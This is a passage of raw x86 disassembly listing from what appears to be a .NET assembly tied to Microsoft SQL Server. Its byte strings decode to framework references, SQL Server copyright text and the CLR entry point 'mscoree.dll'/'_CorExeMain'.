  408d96:	imul   ebp,DWORD PTR [edi+0x6e],0x302e343d
  408d9d:	xor    BYTE PTR cs:[esi],ch
  408da0:	xor    BYTE PTR [eax+eiz*1],ch
  408da3:	inc    ebx
  408da4:	jne    0x408e12
  408da6:	je     0x408e1d
  408da8:	jb     0x408e0f
  408daa:	cmp    eax,0x7475656e
  408daf:	jb     0x408e12
  408db1:	ins    BYTE PTR es:[edi],dx
  408db2:	sub    al,0x20
  408db4:	push   eax
  408db5:	jne    0x408e19
  408db7:	ins    BYTE PTR es:[edi],dx
  408db8:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  408dbf:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  408dc3:	bound  esi,QWORD PTR [edi]
  408dc5:	aaa    
  408dc6:	popa   
  408dc7:	xor    eax,0x31363563
  408dcc:	cmp    DWORD PTR [ebx],esi
  408dce:	xor    al,0x65
  408dd0:	xor    BYTE PTR [eax],bh
  408dd2:	cmp    DWORD PTR [edi],ecx
  408dd4:	inc    ebx
  408dd5:	outs   dx,DWORD PTR ds:[esi]
  408dd6:	outs   dx,BYTE PTR ds:[esi]
  408dd7:	arpl   WORD PTR [ebp+0x72],si
  408dda:	jb     0x408e41
  408ddc:	outs   dx,BYTE PTR ds:[esi]
  408ddd:	arpl   WORD PTR [ecx+0x4d],di
  408de0:	outs   dx,DWORD PTR ds:[esi]
  408de1:	fs add al,BYTE PTR gs:[eax]
  408de5:	add    BYTE PTR [eax],al
  408de7:	push   esp
  408de8:	add    bl,BYTE PTR [esi]
  408dea:	dec    ecx
  408deb:	outs   dx,BYTE PTR ds:[esi]
  408dec:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  408df0:	gs inc ebp
  408df2:	js     0x408e57
  408df4:	gs jo  0x408e6b
  408df7:	imul   ebp,DWORD PTR [edi+0x6e],0x61746544
  408dfe:	imul   ebp,DWORD PTR [ecx+ecx*2+0x6e],0x6c756146
  408e06:	je     0x408e7b
  408e08:	add    DWORD PTR [ebp+edx*2+0x7f],edx
  408e0c:	push   ebx
  408e0d:	jns    0x408e82
  408e0f:	je     0x408e76
  408e11:	ins    DWORD PTR es:[edi],dx
  408e12:	cs push ebx
  408e14:	gs jb  0x408e8d
  408e17:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  408e1e:	ins    BYTE PTR es:[edi],dx
  408e1f:	cs dec ecx
  408e21:	outs   dx,BYTE PTR ds:[esi]
  408e22:	jae    0x408e98
  408e24:	popa   
  408e25:	outs   dx,BYTE PTR ds:[esi]
  408e26:	arpl   WORD PTR [ebp+0x43],sp
  408e29:	outs   dx,DWORD PTR ds:[esi]
  408e2a:	outs   dx,BYTE PTR ds:[esi]
  408e2b:	je     0x408e92
  408e2d:	js     0x408ea3
  408e2f:	dec    ebp
  408e30:	outs   dx,DWORD PTR ds:[esi]
  408e31:	fs gs sub al,0x20
  408e35:	push   ebx
  408e36:	jns    0x408eab
  408e38:	je     0x408e9f
  408e3a:	ins    DWORD PTR es:[edi],dx
  408e3b:	cs push ebx
  408e3d:	gs jb  0x408eb6
  408e40:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  408e47:	ins    BYTE PTR es:[edi],dx
  408e48:	sub    al,0x20
  408e4a:	push   esi
  408e4b:	gs jb  0x408ec1
  408e4e:	imul   ebp,DWORD PTR [edi+0x6e],0x302e343d
  408e55:	xor    BYTE PTR cs:[esi],ch
  408e58:	xor    BYTE PTR [eax+eiz*1],ch
  408e5b:	inc    ebx
  408e5c:	jne    0x408eca
  408e5e:	je     0x408ed5
  408e60:	jb     0x408ec7
  408e62:	cmp    eax,0x7475656e
  408e67:	jb     0x408eca
  408e69:	ins    BYTE PTR es:[edi],dx
  408e6a:	sub    al,0x20
  408e6c:	push   eax
  408e6d:	jne    0x408ed1
  408e6f:	ins    BYTE PTR es:[edi],dx
  408e70:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  408e77:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  408e7b:	bound  esi,QWORD PTR [edi]
  408e7d:	aaa    
  408e7e:	popa   
  408e7f:	xor    eax,0x31363563
  408e84:	cmp    DWORD PTR [ebx],esi
  408e86:	xor    al,0x65
  408e88:	xor    BYTE PTR [eax],bh
  408e8a:	cmp    DWORD PTR [ebx],edx
  408e8c:	dec    ecx
  408e8d:	outs   dx,BYTE PTR ds:[esi]
  408e8e:	jae    0x408f04
  408e90:	popa   
  408e91:	outs   dx,BYTE PTR ds:[esi]
  408e92:	arpl   WORD PTR [ebp+0x43],sp
  408e95:	outs   dx,DWORD PTR ds:[esi]
  408e96:	outs   dx,BYTE PTR ds:[esi]
  408e97:	je     0x408efe
  408e99:	js     0x408f0f
  408e9b:	dec    ebp
  408e9c:	outs   dx,DWORD PTR ds:[esi]
  408e9d:	fs add BYTE PTR gs:[eax],al
  408ea1:	add    BYTE PTR [eax],al
  408ea3:	or     BYTE PTR [eax],al
  408ea5:	add    al,BYTE PTR [ecx]
  408ea7:	adc    cl,BYTE PTR [ebp+0x12]
  408eaa:	add    DWORD PTR [ecx-0x7eedf9fc],0x2000689
  408eb4:	add    DWORD PTR [eax+edx*1],ebx
  408eb7:	add    al,BYTE PTR [esi+eax*1]
  408eba:	adc    al,BYTE PTR [ecx+0x1200691]
  408ec0:	add    DWORD PTR [edx],edx
  408ec2:	adc    DWORD PTR [ebp+0x13005],0xa04001e
  408ecc:	add    DWORD PTR [edx],edx
  408ece:	xor    al,0x4
  408ed0:	push   es
  408ed1:	adc    DWORD PTR [ecx+0x120069d],eax
  408ed7:	add    DWORD PTR [ecx],edx
  408ed9:	sbb    DWORD PTR [ebp+0x1012005],0x20061512
  408ee3:	add    DWORD PTR [ecx],eax
  408ee5:	adc    al,BYTE PTR [ecx+0x1200689]
  408eeb:	add    DWORD PTR [edx],edx
  408eed:	and    DWORD PTR [ebp+0x1205070b],0x15129981
  408ef7:	adc    bl,BYTE PTR [ebp+0x2]
  408efa:	sbb    al,0x5
  408efc:	add    BYTE PTR [ecx],al
  408efe:	adc    cl,BYTE PTR [ebp+0xe]
  408f01:	add    eax,0x12010120
  408f06:	dec    ebp
  408f07:	add    eax,0x81120020
  408f0c:	lods   eax,DWORD PTR ds:[esi]
  408f0d:	add    eax,0x51d0100
  408f12:	sbb    al,0x5
  408f14:	pop    es
  408f15:	add    DWORD PTR [edx],edx
  408f17:	sub    DWORD PTR [ebp+0x12002005],0x1508b181
  408f21:	adc    al,BYTE PTR [ecx-0x7eedfe4b]
  408f27:	mov    ecx,0x81121508
  408f2c:	xor    DWORD PTR [ecx],eax
  408f2e:	adc    al,BYTE PTR [ecx+0x2070db9]
  408f34:	adc    al,BYTE PTR [ecx-0x7eedea4f]
  408f3a:	mov    ch,0x1
  408f3c:	adc    al,BYTE PTR [ecx+0x200ab9]
  408f42:	adc    eax,0x1bd8112
  408f47:	adc    al,BYTE PTR [ecx+0x1070ac1]
  408f4d:	adc    eax,0x1bd8112
  408f52:	adc    al,BYTE PTR [ecx+0x2005c1]
  408f58:	adc    al,BYTE PTR [ecx+0x1200681]
  408f5e:	add    DWORD PTR [edx],edx
  408f60:	add    ebp,0x12010705
  408f66:	add    ebp,0x12012007
  408f6c:	or     ecx,0x7050210
  408f72:	add    DWORD PTR [edx],edx
  408f74:	or     ecx,0x81121d04
  408f7a:	int    0x7
  408f7c:	and    BYTE PTR [ecx],al
  408f7e:	add    DWORD PTR ds:0x6cd8112,ebx
  408f84:	pop    es
  408f85:	add    DWORD PTR ds:0x3cd8112,ebx
  408f8b:	push   es
  408f8c:	adc    cl,BYTE PTR [eax+0x4]
  408f8f:	pop    es
  408f90:	add    DWORD PTR [edx],edx
  408f92:	jo     0x408f97
  408f94:	push   es
  408f95:	adc    cl,BYTE PTR [esi+ecx*1+0x20]
  408f99:	push   es
  408f9a:	adc    al,BYTE PTR [ecx+0x120e0ed1]
  408fa0:	popa   
  408fa1:	push   cs
  408fa2:	add    dl,BYTE PTR [ecx]
  408fa4:	adc    ebp,0x12010704
  408faa:	gs mov esi,cr0
  408fae:	adc    al,BYTE PTR [ecx+0xe0e0edd]
  408fb4:	add    dl,BYTE PTR [edx]
  408fb6:	and    ecx,0xad98112
  408fbc:	pop    es
  408fbd:	add    edx,DWORD PTR [edx]
  408fbf:	sbb    ecx,0x12dd8112
  408fc5:	je     0x408fce
  408fc7:	add    BYTE PTR [edx],al
  408fc9:	sbb    al,0x12
  408fcb:	sbb    cl,0xe
  408fce:	or     esp,DWORD PTR [eax]
  408fd0:	add    eax,0x110e0e08
  408fd5:	and    ebp,0x50e1002
  408fdb:	pop    es
  408fdc:	add    DWORD PTR [ecx],edx
  408fde:	and    ebp,0xe022008
  408fe4:	push   cs
  408fe5:	adc    BYTE PTR [edx],dl
  408fe7:	add    ebp,0x12020706
  408fed:	add    ebp,0x120040e
  408ff3:	add    DWORD PTR [edx],ecx
  408ff5:	add    esp,DWORD PTR [eax]
  408ff7:	add    BYTE PTR [edx],cl
  408ff9:	pop    es
  408ffa:	and    BYTE PTR [ebx],al
  408ffc:	or     BYTE PTR ds:0x8080805,bl
  409002:	pop    es
  409003:	add    edx,DWORD PTR [edx]
  409005:	gs sbb eax,0x4051d05
  40900b:	pop    es
  40900c:	add    DWORD PTR [edx],edx
  40900e:	js     0x409014
  409010:	pop    es
  409011:	add    al,BYTE PTR [edx]
  409013:	sbb    al,0x4
  409015:	push   es
  409016:	adc    al,BYTE PTR [eax+0x10705bd]
  40901c:	adc    al,BYTE PTR [eax+0x12006bd]
  409022:	add    DWORD PTR [edx],edx
  409024:	xor    ebp,0x1206070b
  40902a:	xor    ebp,0x7c120202
  409030:	sbb    al,0x1c
  409032:	add    eax,0x1
  409037:	add    BYTE PTR [ecx],bl
  409039:	add    DWORD PTR [eax],eax
  40903b:	adc    al,0x4d
  40903d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  409044:	je     0x409066
  409046:	push   ebx
  409047:	push   ecx
  409048:	dec    esp
  409049:	and    BYTE PTR [ebx+0x65],dl
  40904c:	jb     0x4090c4
  40904e:	gs jb  0x409051
  409051:	add    BYTE PTR [ecx],ch
  409053:	add    DWORD PTR [eax],eax
  409055:	and    al,0x4d
  409057:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40905e:	je     0x409080
  409060:	inc    ebx
  409061:	outs   dx,DWORD PTR ds:[esi]
  409062:	jb     0x4090d4
  409064:	and    BYTE PTR cs:[ecx+0x6c],al
  409068:	ins    BYTE PTR es:[edi],dx
  409069:	and    BYTE PTR [edx+0x69],dh
  40906c:	addr16 push 0x72207374
  409072:	gs jae 0x4090da
  409075:	jb     0x4090ed
  409077:	gs fs add BYTE PTR cs:[eax],al
  40907c:	sbb    al,BYTE PTR [ecx]
  40907e:	add    BYTE PTR ds:0x7263694d,dl
  409084:	outs   dx,DWORD PTR ds:[esi]
  409085:	jae    0x4090f6
  409087:	data16 je 0x4090aa
  40908a:	inc    ebx
  40908b:	outs   dx,DWORD PTR ds:[esi]
  40908c:	jb     0x4090fe
  40908e:	outs   dx,DWORD PTR ds:[esi]
  40908f:	jb     0x4090f2
  409091:	je     0x4090fc
  409093:	outs   dx,DWORD PTR ds:[esi]
  409094:	outs   dx,BYTE PTR ds:[esi]
  409095:	add    BYTE PTR [eax],al
  409097:	sub    al,0x1
  409099:	add    BYTE PTR [edi],ah
  40909b:	xor    DWORD PTR [ecx],esi
  40909d:	xor    BYTE PTR cs:[esi],ch
  4090a0:	xor    dh,BYTE PTR [ecx]
  4090a2:	xor    BYTE PTR [eax],dh
  4090a4:	cs xor BYTE PTR ss:[eax],ah
  4090a8:	sub    BYTE PTR [eax],ch
  4090aa:	push   ebx
  4090ab:	push   ecx
  4090ac:	dec    esp
  4090ad:	xor    DWORD PTR [ecx],esi
  4090af:	pop    edi
  4090b0:	push   edx
  4090b1:	push   esp
  4090b2:	dec    ebp
  4090b3:	sub    DWORD PTR [esi],ebp
  4090b5:	xor    DWORD PTR [edx],esi
  4090b7:	xor    BYTE PTR [edx],dh
  4090b9:	xor    DWORD PTR [eax],esi
  4090bb:	sub    eax,0x36343831
  4090c0:	and    BYTE PTR [ecx],ch
  4090c2:	add    BYTE PTR [eax],al
  4090c4:	adc    DWORD PTR [ecx],eax
  4090c6:	add    BYTE PTR [ecx+esi*1],cl
  4090c9:	xor    DWORD PTR [esi],ebp
  4090cb:	xor    BYTE PTR [esi],ch
  4090cd:	xor    dh,BYTE PTR [ecx]
  4090cf:	xor    BYTE PTR [eax],dh
  4090d1:	cs xor BYTE PTR ss:[eax],al
  4090d5:	add    BYTE PTR ds:0x65300001,dh
  4090db:	cmp    bl,BYTE PTR [ebx+esi*2+0x71]
  4090df:	ins    BYTE PTR es:[edi],dx
  4090e0:	xor    DWORD PTR [ecx],esi
  4090e2:	pop    edi
  4090e3:	ins    DWORD PTR es:[edi],dx
  4090e4:	popa   
  4090e5:	imul   ebp,DWORD PTR [esi+0x5f],0x735c5c74
  4090ec:	jno    0x40915a
  4090ee:	pop    esp
  4090ef:	inc    ebx
  4090f0:	outs   dx,DWORD PTR ds:[esi]
  4090f1:	ins    DWORD PTR es:[edi],dx
  4090f2:	ins    DWORD PTR es:[edi],dx
  4090f3:	outs   dx,DWORD PTR ds:[esi]
  4090f4:	outs   dx,BYTE PTR ds:[esi]
  4090f5:	pop    esp
  4090f6:	push   ebx
  4090f7:	dec    esi
  4090f8:	dec    ebx
  4090f9:	pop    esp
  4090fa:	push   ebx
  4090fb:	push   ecx
  4090fc:	dec    esp
  4090fd:	xor    dh,BYTE PTR [eax]
  4090ff:	xor    BYTE PTR [ebx],dh
  409101:	push   ebx
  409102:	dec    esi
  409103:	dec    ebx
  409104:	inc    ebp
  409105:	pop    ecx
  409106:	cs jae 0x409177
  409109:	imul   eax,DWORD PTR [eax],0x0
  40910c:	add    eax,0x10001
  409111:	add    BYTE PTR [edi],ch
  409113:	add    DWORD PTR [eax],eax
  409115:	sub    dl,BYTE PTR [edx+0x65]
  409118:	jo     0x409189
  40911a:	jb     0x409190
  40911c:	imul   ebp,DWORD PTR [esi+0x67],0x72655320
  409123:	jbe    0x40918e
  409125:	arpl   WORD PTR [ebp+0x73],sp
  409128:	and    BYTE PTR [eax+0x72],dl
  40912b:	gs jbe 0x409197
  40912e:	gs ja  0x409151
  409131:	push   eax
  409132:	jb     0x4091a3
  409134:	arpl   WORD PTR [ebp+0x73],sp
  409137:	jae    0x4091a2
  409139:	outs   dx,BYTE PTR ds:[esi]
  40913a:	and    BYTE PTR [bx+si+0x6f],cl
  40913e:	jae    0x4091b4
  409140:	add    BYTE PTR [eax],al
  409142:	dec    ebp
  409143:	add    DWORD PTR [eax],eax
  409145:	dec    eax
  409146:	dec    ebp
  409147:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40914e:	je     0x409170
  409150:	push   ebx
  409151:	push   ecx
  409152:	dec    esp
  409153:	and    BYTE PTR [ebx+0x65],dl
  409156:	jb     0x4091ce
  409158:	gs jb  0x40917b
  40915b:	imul   esi,DWORD PTR [ebx+0x20],0x65722061
  409162:	imul   esi,DWORD PTR [bp+di+0x74],0x64657265
  40916a:	and    BYTE PTR [edx+esi*2+0x61],dh
  40916e:	fs gs ins DWORD PTR es:[edi],dx
  409171:	popa   
  409172:	jb     0x4091df
  409174:	and    BYTE PTR [edi+0x66],ch
  409177:	and    BYTE PTR [ebp+0x69],cl
  40917a:	arpl   WORD PTR [edx+0x6f],si
  40917d:	jae    0x4091ee
  40917f:	data16 je 0x4091a2
  409182:	inc    ebx
  409183:	outs   dx,DWORD PTR ds:[esi]
  409184:	jb     0x4091f6
  409186:	outs   dx,DWORD PTR ds:[esi]
  409187:	jb     0x4091ea
  409189:	je     0x4091f4
  40918b:	outs   dx,DWORD PTR ds:[esi]
  40918c:	outs   dx,BYTE PTR ds:[esi]
  40918d:	add    BYTE PTR cs:[eax],al
  409190:	or     BYTE PTR [ecx],al
  409192:	add    BYTE PTR [edx],al
  409194:	add    BYTE PTR [eax],al
  409196:	add    BYTE PTR [eax],al
  409198:	add    BYTE PTR [eax],cl
  40919a:	add    DWORD PTR [eax],eax
  40919c:	or     BYTE PTR [eax],al
  40919e:	add    BYTE PTR [eax],al
  4091a0:	add    BYTE PTR [eax],al
  4091a2:	push   ds
  4091a3:	add    DWORD PTR [eax],eax
  4091a5:	add    DWORD PTR [eax],eax
  4091a7:	push   esp
  4091a8:	add    dl,BYTE PTR [esi]
  4091aa:	push   edi
  4091ab:	jb     0x40920e
  4091ad:	jo     0x4091fd
  4091af:	outs   dx,DWORD PTR ds:[esi]
  4091b0:	outs   dx,BYTE PTR ds:[esi]
  4091b1:	inc    ebp
  4091b2:	js     0x409217
  4091b4:	gs jo  0x40922b
  4091b7:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  4091be:	ja     0x409233
  4091c0:	add    DWORD PTR [eax],eax
  4091c2:	add    BYTE PTR [eax],al
  4091c4:	add    BYTE PTR [eax],al
  4091c6:	add    BYTE PTR [eax],al
  4091c8:	je     0x4091a8
  4091ca:	xor    eax,0x4f
  4091cf:	add    BYTE PTR [edx],al
  4091d1:	add    BYTE PTR [eax],al
  4091d3:	add    BYTE PTR ds:0xe0000000,dh
  4091d9:	xchg   ecx,eax
  4091da:	add    BYTE PTR [eax],al
  4091dc:	loopne 0x409251
  4091de:	add    BYTE PTR [eax],al
  4091e0:	push   edx
  4091e1:	push   ebx
  4091e2:	inc    esp
  4091e3:	push   ebx
  4091e4:	sbb    eax,0x2606dba2
  4091e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091ea:	or     eax,DWORD PTR [esi+ebp*4+0x21]
  4091ee:	jo     0x409222
  4091f0:	cmp    eax,0x1003037
  4091f5:	add    BYTE PTR [eax],al
  4091f7:	add    BYTE PTR [eax+0x72],dl
  4091fa:	gs jbe 0x409266
  4091fd:	gs ja  0x409250
  409200:	jb     0x409271
  409202:	arpl   WORD PTR [ebp+0x73],sp
  409205:	jae    0x409270
  409207:	outs   dx,BYTE PTR ds:[esi]
  409208:	addr16 push ebx
  40920a:	gs jb  0x409283
  40920d:	imul   esp,DWORD PTR [ebx+0x65],0x6264702e
	...
  409270:	cwde   
  409271:	xchg   edx,eax
	...
  40927a:	add    BYTE PTR [eax],al
  40927c:	scas   al,BYTE PTR es:[edi]
  40927d:	xchg   edx,eax
  40927e:	add    BYTE PTR [eax],al
  409280:	add    BYTE PTR [eax],ah
	...
  409296:	add    BYTE PTR [eax],al
  409298:	mov    al,ds:0x92
  40929d:	add    BYTE PTR [eax],al
  40929f:	add    BYTE PTR [eax],al
  4092a1:	add    BYTE PTR [edi+0x43],bl
  4092a4:	outs   dx,DWORD PTR ds:[esi]
  4092a5:	jb     0x4092ec
  4092a7:	js     0x40930e
  4092a9:	dec    ebp
  4092aa:	popa   
  4092ab:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  4092b2:	jb     0x409319
  4092b4:	gs cs fs ins BYTE PTR es:[edi],dx
  4092b8:	ins    BYTE PTR es:[edi],dx
  4092b9:	add    BYTE PTR [eax],al
  4092bb:	add    BYTE PTR [eax],al
  4092bd:	add    bh,bh
  4092bf:	and    eax,0x402000
